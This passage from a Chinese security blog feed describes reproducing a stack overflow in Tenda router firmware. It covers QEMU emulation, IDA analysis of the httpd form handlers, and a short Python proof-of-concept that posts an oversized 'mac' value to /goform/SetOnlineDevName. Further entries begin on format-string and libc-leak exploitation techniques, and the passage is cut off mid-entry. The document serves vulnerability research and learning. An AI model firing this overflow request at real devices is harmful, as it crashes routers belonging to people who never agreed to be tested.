ifaddrs_get_ifip(lan_ifname, br0IP) &lt; <span class="hljs-number">0</span> ) <span class="hljs-comment">//获取该网卡的 IP 地址</span><br>  &#123;<br>    <span class="hljs-comment">//获取失败</span><br>    GetValue(<span class="hljs-string">&quot;lan.ip&quot;</span>, value);<br>    <span class="hljs-built_in">strcpy</span>(g_lan_ip, value);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-comment">//获取成功</span><br>    <span class="hljs-built_in">strcpy</span>(g_lan_ip, br0IP);<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>分析到这函数的执行流程就很清楚了</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs XL"><span class="hljs-function"><span class="hljs-title">main</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">initWebs</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">websOpenServer</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">websOpenListen</span> -&gt;</span> socketOpenConnection<br><br><br></code></pre></td></tr></table></figure><p>解决办法就是创建一个能检测到的网卡推荐创建br0</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> add name br0 <span class="hljs-built_in">type</span> bridge   <span class="hljs-comment"># 创建 br0 网桥</span><br><span class="hljs-built_in">sudo</span> ip <span class="hljs-built_in">link</span> <span class="hljs-built_in">set</span> br0 up                 <span class="hljs-comment"># 启动 br0</span><br><span class="hljs-built_in">sudo</span> ip addr add 192.168.0.1/24 dev br0  <span class="hljs-comment"># 给 br0 配置 IP（可选）</span><br><br><br></code></pre></td></tr></table></figure><p>成功解决</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213223679.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213223679.png" alt="image-20250403213223679"></a></p><p>用浏览器即可进入WEB界面</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213322564.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403213322564.png" alt="image-20250403213322564"></a></p><h2 id="05-系统模拟运行"><a href="#05-系统模拟运行" class="headerlink" title="05 系统模拟运行"></a>05 系统模拟运行</h2><p>下面展示一下系统模拟运行</p><p>自己再网上总结了很多脚本，自己稍加改动直接一键运行，简直不要太爽（就喜欢这种感觉哈哈），默认账户和密码都是root</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs SH"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment"># ==============================================</span><br><span class="hljs-comment"># QEMU MIPSEL Debian Squeeze 虚拟机安装脚本（带校验功能）</span><br><span class="hljs-comment"># 适用于嵌入式开发/逆向工程环境搭建</span><br><span class="hljs-comment"># ==============================================</span><br><br><span class="hljs-comment"># 配置参数</span><br>WORK_DIR=<span class="hljs-string">&quot;debian-mipsel-qemu&quot;</span><br>IMAGE_FILE=<span class="hljs-string">&quot;debian_squeeze_mipsel_standard.qcow2&quot;</span><br>KERNEL_FILE=<span class="hljs-string">&quot;vmlinux-2.6.32-5-4kc-malta&quot;</span><br>START_SCRIPT=<span class="hljs-string">&quot;start.sh&quot;</span><br><br><span class="hljs-comment"># 1. 创建工作目录（如果不存在）</span><br><span class="hljs-keyword">if</span> [ ! -d <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;创建目录 <span class="hljs-variable">$WORK_DIR</span>...&quot;</span><br>    <span class="hljs-built_in">mkdir</span> -p <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span><br><span class="hljs-keyword">fi</span><br><br><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-variable">$WORK_DIR</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;无法进入目录 <span class="hljs-variable">$WORK_DIR</span>&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br><br><span class="hljs-comment"># 2. 下载镜像文件（如果不存在）</span><br><span class="hljs-function"><span class="hljs-title">download_file</span></span>() &#123;<br>    <span class="hljs-built_in">local</span> url=<span class="hljs-variable">$1</span><br>    <span class="hljs-built_in">local</span> file=<span class="hljs-variable">$2</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在下载 <span class="hljs-variable">$file</span>...&quot;</span><br>        wget <span class="hljs-string">&quot;<span class="hljs-variable">$url</span>&quot;</span> -O <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> || &#123; <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;下载失败&quot;</span>; <span class="hljs-built_in">exit</span> 1; &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$file</span> 已存在，跳过下载&quot;</span><br>    <span class="hljs-keyword">fi</span><br>&#125;<br><br>download_file <span class="hljs-string">&quot;https://people.debian.org/~aurel32/qemu/mipsel/<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span><br>download_file <span class="hljs-string">&quot;https://people.debian.org/~aurel32/qemu/mipsel/<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span><br><br><span class="hljs-comment"># 3. 生成或覆盖启动脚本</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;生成启动脚本...&quot;</span><br><span class="hljs-built_in">cat</span> &gt; <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span> &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br><span class="hljs-comment">#!/bin/bash</span><br><span class="hljs-built_in">sudo</span> qemu-system-mipsel \<br>    -nographic \<br>    -M malta \<br>    -kernel vmlinux-2.6.32-5-4kc-malta \<br>    -hda debian_squeeze_mipsel_standard.qcow2 \<br>    -net nic,macaddr=52:54:00:12:34:56 \<br>    -net tap,ifname=tap0,script=no,downscript=no \<br>    -append <span class="hljs-string">&quot;root=/dev/sda1 console=tty0&quot;</span><br>EOF<br><span class="hljs-built_in">chmod</span> +x <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span><br><br><span class="hljs-comment"># 4. 检查是否所有文件都已准备就绪</span><br>required_files=(<span class="hljs-string">&quot;<span class="hljs-variable">$IMAGE_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$KERNEL_FILE</span>&quot;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span>)<br>missing_files=()<br><br><span class="hljs-keyword">for</span> file <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;required_files[@]&#125;</span>&quot;</span>; <span class="hljs-keyword">do</span><br>    <span class="hljs-keyword">if</span> [ ! -f <span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span> ]; <span class="hljs-keyword">then</span><br>        missing_files+=(<span class="hljs-string">&quot;<span class="hljs-variable">$file</span>&quot;</span>)<br>    <span class="hljs-keyword">fi</span><br><span class="hljs-keyword">done</span><br><br><span class="hljs-keyword">if</span> [ <span class="hljs-variable">$&#123;#missing_files[@]&#125;</span> -ne 0 ]; <span class="hljs-keyword">then</span><br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;错误：以下文件缺失:&quot;</span><br>    <span class="hljs-built_in">printf</span> <span class="hljs-string">&#x27; - %s\n&#x27;</span> <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;missing_files[@]&#125;</span>&quot;</span><br>    <span class="hljs-built_in">exit</span> 1<br><span class="hljs-keyword">fi</span><br><br><span class="hljs-comment"># 5. 启动虚拟机</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;正在启动QEMU虚拟机...&quot;</span><br>./<span class="hljs-string">&quot;<span class="hljs-variable">$START_SCRIPT</span>&quot;</span><br><br><br></code></pre></td></tr></table></figure><p>启动完成我们就要配置网络了，实现主机虚拟机通信</p><p>配置网卡</p><p><strong>1. 在宿主机创建 TAP 设备</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ROUTEROS">sudo<span class="hljs-built_in"> ip </span>tuntap <span class="hljs-built_in">add</span> dev tap0 mode tap<br>sudo<span class="hljs-built_in"> ip </span>link <span class="hljs-built_in">set</span> tap0 up<br>sudo<span class="hljs-built_in"> ip </span>addr <span class="hljs-built_in">add</span> 10.10.10.1/24 dev tap0<br><br><br></code></pre></td></tr></table></figure><p><strong>2. 在虚拟机内配置 IP</strong></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ROUTEROS">ip addr <span class="hljs-built_in">add</span> 10.10.10.2/24 dev eth0 <span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">set</span> eth0 up<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">add</span> br0<span class="hljs-built_in"> type </span>dummy<span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>addr <span class="hljs-built_in">add</span> 10.10.10.3/24 dev br0  <span class="hljs-built_in"></span><br><span class="hljs-built_in">ip </span>link <span class="hljs-built_in">set</span> br0 up<br><br><br></code></pre></td></tr></table></figure><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220001392.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220001392.png" alt="image-20250403220001392"></a></p><p>把文件系统打包一下，然后用http服务发送到虚拟机</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220113012.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220113012.png" alt="image-20250403220113012"></a></p><p>虚拟机这边用wget下载一下，解压文件系统</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220234903.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403220234903.png" alt="image-20250403220234903"></a></p><p>然后运行启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs BASH"><span class="hljs-built_in">chroot</span> . sh<br>./bin/httpd<br><br>BASH<br></code></pre></td></tr></table></figure><p>直接访问10.10.10.3:80也能出现WEB界面</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403233420135.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403233420135.png" alt="img"></a></p><p>由于我们终端运行着WEB服务，要看输出信息，所有我们可以连一个SSH以执行其他命令</p><h2 id="06逆向分析与漏洞复现"><a href="#06逆向分析与漏洞复现" class="headerlink" title="06逆向分析与漏洞复现"></a>06逆向分析与漏洞复现</h2><p>用IDA打开httpd分析一下</p><p>再<code>initWebs</code>是初始话web界面，并根据提交表单调用相应功能</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">initWebs</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v0; <span class="hljs-comment">// $v0</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// $v0</span><br>  <span class="hljs-type">char</span> *cp; <span class="hljs-comment">// [sp+30h] [+30h]</span><br>  in_addr intaddr; <span class="hljs-comment">// [sp+34h] [+34h] BYREF</span><br>  <span class="hljs-type">char</span> host[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+38h] [+38h] BYREF</span><br>  <span class="hljs-type">char</span> webdir[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+B8h] [+B8h] BYREF</span><br>  <span class="hljs-type">char_t</span> wbuf[<span class="hljs-number">128</span>]; <span class="hljs-comment">// [sp+138h] [+138h] BYREF</span><br><br>  <span class="hljs-built_in">memset</span>(wbuf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(wbuf));<br>  doSystemCmd(<span class="hljs-string">&quot;echo 0 &gt; /proc/sys/net/ipv4/tcp_timestamps&quot;</span>);<br>  socketOpen();<br>  inet_aton(g_lan_ip, &amp;intaddr);<br>  <span class="hljs-built_in">strcpy</span>(webdir, rootWeb);<br>  websSetDefaultDir(webdir);<br>  cp = inet_ntoa(intaddr);<br>  v0 = <span class="hljs-built_in">strlen</span>(cp) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v0 &gt;= <span class="hljs-number">0x80</span> )<br>    v0 = <span class="hljs-number">0x80</span>;<br>  ascToUni(wbuf, cp, v0);<br>  websSetIpaddr(wbuf);<br>  v1 = <span class="hljs-built_in">strlen</span>(host) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v1 &gt;= <span class="hljs-number">0x80</span> )<br>    v1 = <span class="hljs-number">0x80</span>;<br>  ascToUni(wbuf, host, v1);<br>  websSetHost(wbuf);<br>  websSetDefaultPage(<span class="hljs-string">&quot;index.html&quot;</span>);<br>  websSetPassword(password);<br>  <span class="hljs-keyword">if</span> ( websOpenServer(port, retries) &gt;= <span class="hljs-number">0</span> )<br>  &#123;<br>    websUrlHandlerDefine(byte_46FC3C, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, R7WebsSecurityHandler, <span class="hljs-number">1</span>);<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/goform&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websFormHandler, <span class="hljs-number">0</span>);<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/cgi-bin&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, webs_Tenda_CGI_BIN_Handler, <span class="hljs-number">0</span>);<br>    websUrlHandlerDefine(byte_46FC3C, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websDefaultHandler, <span class="hljs-number">2</span>);<br>    formDefineTendDa();<br>    websUrlHandlerDefine(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, websHomePageHandler, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s %d: websOpenServer failed\n&quot;</span>, <span class="hljs-string">&quot;initWebs&quot;</span>, <span class="hljs-number">0x1D0</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0xFFFFFFFF</span>;<br>  &#125;<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>在<code>formDefineTendDa</code>函数中就是各个表单调用的程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">formDefineTendDa</span><span class="hljs-params">()</span><br>&#123;<br>  websAspDefine(<span class="hljs-string">&quot;aspGetCharset&quot;</span>, aspGetCharset);<br>  websFormDefine(<span class="hljs-string">&quot;getOnlineList&quot;</span>, formGetOnlineList);<br>  websAspDefine(<span class="hljs-string">&quot;asp_error_message&quot;</span>, asp_error_message);<br>  websAspDefine(<span class="hljs-string">&quot;asp_error_redirect_url&quot;</span>, asp_error_redirect_url);<br>  websFormDefine(<span class="hljs-string">&quot;SetOnlineDevName&quot;</span>, formSetDeviceName);<br>  websFormDefine(<span class="hljs-string">&quot;setBlackRule&quot;</span>, formAddMacfilterRule);<br>  websFormDefine(<span class="hljs-string">&quot;delBlackRule&quot;</span>, formDelMacfilterRule);<br>  websFormDefine(<span class="hljs-string">&quot;getBlackRuleList&quot;</span>, formGetMacfilterRuleList);<br>  websFormDefine(<span class="hljs-string">&quot;getDeviceInfo&quot;</span>, formGetDeviceInfo);<br>  websFormDefine(<span class="hljs-string">&quot;telnet&quot;</span>, TendaTelnet);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolReboot&quot;</span>, fromSysToolReboot);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolRestoreSet&quot;</span>, fromSysToolRestoreSet);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolChangePwd&quot;</span>, fromSysToolChangePwd);<br>  websFormDefine(<span class="hljs-string">&quot;SysToolSetUpgrade&quot;</span>, fromSysToolSetUpgrade);<br>  websFormDefine(<span class="hljs-string">&quot;WifiBasicGet&quot;</span>, formWifiBasicGet);<br>  websFormDefine(<span class="hljs-string">&quot;WifiBasicSet&quot;</span>, formWifiBasicSet);<br>  websFormDefine(<span class="hljs-string">&quot;WifiApScan&quot;</span>, formWifiApScan);<br>  websFormDefine(<span class="hljs-string">&quot;ate&quot;</span>, TendaAte);<br>  websFormDefine(<span class="hljs-string">&quot;setApModeCfg&quot;</span>, fromsetApModeCfg);<br>  websFormDefine(<span class="hljs-string">&quot;getApModeCfg&quot;</span>, fromgetApModeCfg);<br>  websFormDefine(<span class="hljs-string">&quot;WifiExtraSet&quot;</span>, fromSetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;getQuicksetBridge&quot;</span>, fromGetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;getStatusBeforeBridge&quot;</span>, fromGetWirelessRepeat);<br>  websFormDefine(<span class="hljs-string">&quot;exit&quot;</span>, formExit);<br>  websFormDefine(<span class="hljs-string">&quot;hasLoginPwd&quot;</span>, formhasLoginPwd);<br>  websFormDefine(<span class="hljs-string">&quot;loginOut&quot;</span>, fromLoginOut);<br>  websFormDefine(<span class="hljs-string">&quot;sysToolsInfo&quot;</span>, fromSysToolsInfo);<br>&#125;<br><br><br></code></pre></td></tr></table></figure><p>根据大佬的话说就是多关注带有set的功能，因为大多数是需要接受前端数据，进行设置操作的，因此存在较高的安全风险</p><p>分析处理<code>SetOnlineDevName</code> 请求的<code>formSetDeviceName</code> 函数，其中的<code>set_device_name</code>发现漏洞</p><p>没有对字符串长度校验，使用<code>sprintf</code>会造成栈溢出漏洞导致程序崩溃</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403234633289.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403234633289.png" alt="image-20250403234633289"></a></p><p>写一个POC测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Date    : 2025-04-03 17:12:39</span><br><span class="hljs-comment"># @Author  : Your Name (you@example.org)</span><br><span class="hljs-comment"># @Link    : http://example.org</span><br><span class="hljs-comment"># @Version : $Id$</span><br><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> requests<br><br>ip = <span class="hljs-string">&#x27;10.10.10.3&#x27;</span><br><br>url =  <span class="hljs-string">f&#x27;http://<span class="hljs-subst">&#123;ip&#125;</span>/goform/SetOnlineDevName&#x27;</span><br><br>payload = &#123;<br>  <span class="hljs-string">&quot;mac&quot;</span>: <span class="hljs-string">&#x27;00:0c:29:5f:4d:3c&#x27;</span> * <span class="hljs-number">0x100</span>,<br>  <span class="hljs-string">&quot;devName&quot;</span>: <span class="hljs-string">&#x27;devname1&#x27;</span><br>&#125;<br><br>res = requests.post(url=url , data=payload)<br><span class="hljs-built_in">print</span>(res.content)<br><br><br></code></pre></td></tr></table></figure><p>但是和我们预想的不一样</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235024376.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235024376.png" alt="image-20250403235024376"></a></p><p>发现程序并没有崩溃，还打印了信息**device name setted failed!*<em>和*<em>set device name error!</em></em></p><p>进入IDA定位一下执行位置，发现进入下边这个分支</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235342842.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235342842.png" alt="image-20250403235342842"></a></p><p>是应为调用<code>tpi_set_mac_info</code>这个外部函数是进行写入<code>nvram</code> 设备的操作，但是我们用qemu模拟的就会调用失败，进入这个分支，所有我们可以改变一下程序的执行流，用IDA进行patch一下，直接把跳转指令nop掉就达到我们的目的了</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235921306.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250403235921306.png" alt="image-20250403235921306"></a></p><p>patch成功，传入mips虚拟机运行</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000347583.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000347583.png" alt="image-20250404000347583"></a></p><p>再次发从POC程序崩溃</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000707382.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250404000707382.png" alt="image-20250404000707382"></a></p><p>至此漏洞复现工作完成，虽然比较简单，但是还是学到很多东西</p>]]></content>
    
    
    <categories>
      
      <category>IOT安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>非栈上格式化字符串漏洞利用</title>
    <link href="/2025/03/22/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <url>/2025/03/22/%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="非栈上格式化字符串漏洞"><a href="#非栈上格式化字符串漏洞" class="headerlink" title="非栈上格式化字符串漏洞"></a>非栈上格式化字符串漏洞</h1><p>非栈上格式化字符串漏洞对于任意地址读取还是一样的，但是对于任意地址写就变化很大了。</p><p>我们只要利用ebp链来进行任意地址写，下面用一个例题说明</p><p><a href="https://files.buuoj.cn/files/b89c9875750eb5e534b0d8b13e174531/xman_2019_format">附件地址</a></p><p>题目漏洞点如下</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250322212208905.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250322212208905.png" alt="image-20250322212208905"></a></p><p>但是前面的格式化字符串储存在堆上，我们就不能用常规的栈上格式化字符串进行任意地址写，需要找一个中间介质</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250322212745163.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/image-20250322212745163.png" alt="image-20250322212745163"></a></p><p>我们只需利用链1把C的地址改为目标地址，然后用利用链2就可以改目标地址的值了。</p><p><a href="https://blog.csdn.net/zzq487782568/article/details/122972488">参考wp</a></p>]]></content>
    
    
    <categories>
      
      <category>格式化字符串</category>
      
    </categories>
    
    
    <tags>
      
      <tag>非栈上格式化字符串</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>stdout泄露libc</title>
    <link href="/2025/03/19/stdout%E6%B3%84%E9%9C%B2libc/"/>
    <url>/2025/03/19/stdout%E6%B3%84%E9%9C%B2libc/</url>
    
    <content type="html"><![CDATA[<h1 id="stdout泄露libc"><a href="#stdout泄露libc" class="headerlink" title="stdout泄露libc"></a>stdout泄露libc</h1><blockquote><p>国赛落下帷幕，发现自己还是太菜了，仅仅拿了个赛区二等奖。继续沉淀吧，复现一下赛题</p></blockquote><h2 id="原理与规律"><a href="#原理与规律" class="headerlink" title="原理与规律"></a>原理与规律</h2><p>FILE 在 linux 系统的标准IO库使用来描述文件结构，称之为文件流。</p><p>“流”是一种抽象概念，只是人们为了便于描述数据的流向而创造的名称。</p><p>比如说当我们要输出磁盘中记录的数据，那么在计算机中首先会将磁盘中的数据加载进内存，那么磁盘–&gt;内存这种流向就被抽象叫做”流”。</p><p>进程中的FILE结构会通过 <code>_chain</code>域彼此连接形成一个链表，链表头部用全局变量<code>_IO_list_all</code>表示，通过这个值可以遍历所有的FILE结构，大致的链表结构如下图：</p><p><a href="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/e99e2835af561bb871032af6afda6efda4432203.png"><img src="https://raw.githubusercontent.com/p0ach1l/Picture/main/test/e99e2835af561bb871032af6afda6efda4432203.png" alt="1"></a></p><p>1</p><p>每个程序启动时有三个文件流是自动打开的：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>。</p><p>因为会自动打开，所以在初始状态下，_IO_list_all 指向了一个有这些文件流构成的链表，但是需要注意的是这三个文件流位于的是<code>libc.so的数据段</code>。</p><p>具体原理可以看这篇<a 